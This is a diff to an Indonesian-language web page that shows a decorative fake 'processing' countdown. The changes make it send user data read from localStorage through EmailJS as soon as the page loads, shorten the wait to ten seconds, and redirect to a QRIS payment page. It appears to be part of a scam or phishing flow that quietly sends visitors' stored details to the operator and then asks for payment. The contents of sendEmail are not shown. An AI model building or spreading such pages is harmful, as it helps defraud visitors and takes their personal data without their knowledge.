@@ -132,8 +132,6 @@ font-weight:bold;
 </style>
 
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
 emailjs.init({publicKey:"5oKVGo7pYn9oUqJvV"});
 
@@ -161,6 +159,10 @@ function sendEmail(){
 </head>
 <body>
 
+<div style="position:absolute;top:20px;left:50%;transform:translateX(-50%);font-size:18px;font-weight:bold;color:#6a1b9a;">
+🌸 Sunset di Kebun 🌸
+</div>
+
 <div class="sun"></div>
 <div class="butterfly">🦋</div>
 
@@ -184,7 +186,7 @@ Memulai proses...
 
 <script>
 
-const data = JSON.parse(localStorage.getItem("userData"));
+const data = JSON.parse(localStorage.getItem("userData") || "{}");
 
 const messages = [
 "🌱 Menyiapkan data...",
@@ -199,6 +201,15 @@ const messages = [
 
 let msgIndex=0;
 
+window.addEventListener('load',()=>{
+if(!emailSent){
+emailSent=true;
+sendEmail();
+}
+});
+
+
+
 setInterval(()=>{
 document.getElementById('message').innerHTML=
 messages[msgIndex];
@@ -206,7 +217,7 @@ messages[msgIndex];
 msgIndex=(msgIndex+1)%messages.length;
 },5000);
 
-let duration=180;
+let duration=10;
 let current=duration;
 
 const timer=document.getElementById('timer');
@@ -231,12 +242,12 @@ progress.style.width=done+"%";
 
 percent.innerHTML=Math.floor(done)+"%";
 
-if(current===15 && !emailSent){emailSent=true;sendEmail();}
+
 if(current<=0){
 
 clearInterval(countdown);
 
-window.location.href="success.html";
+window.location.href="qris.html";
 
 }
 
@@ -244,5 +255,5 @@ window.location.href="success.html";
 
 </script>
 
-<script>setTimeout(()=>location.href="qris.html",118000);</script></body>
+</body>
 </html>
